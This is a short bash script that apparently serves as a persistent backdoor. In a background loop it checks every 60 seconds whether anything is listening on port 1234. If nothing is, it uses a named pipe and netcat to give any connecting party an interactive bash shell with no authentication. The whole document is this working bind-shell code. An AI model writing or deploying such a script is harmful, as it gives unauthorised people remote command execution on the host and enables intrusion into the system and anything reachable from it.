#!/bin/bash

PORT=1234
FIFO="/tmp/fifo"

while true; 
do

    # Check if the listener is already active
    LISTENER_PID=$(lsof -ti :$PORT)

    if [ -z "$LISTENER_PID" ]; then
        echo "Listener is not active. Starting listener on port $PORT..."

        # Create the FIFO (named pipe) if it doesn't exist
        if [ ! -p "$FIFO" ]; then
            mkfifo "$FIFO"
        fi

        # Start the listener using the FIFO method
        cat "$FIFO" | /bin/bash -i 2>&1 | nc -l -p "$PORT" > "$FIFO" &
        echo "Listener started successfully."
    else
        echo "Listener is already active on port $PORT (PID: $LISTENER_PID). Exiting..."
        exit 1
    fi;

sleep 60; 
done &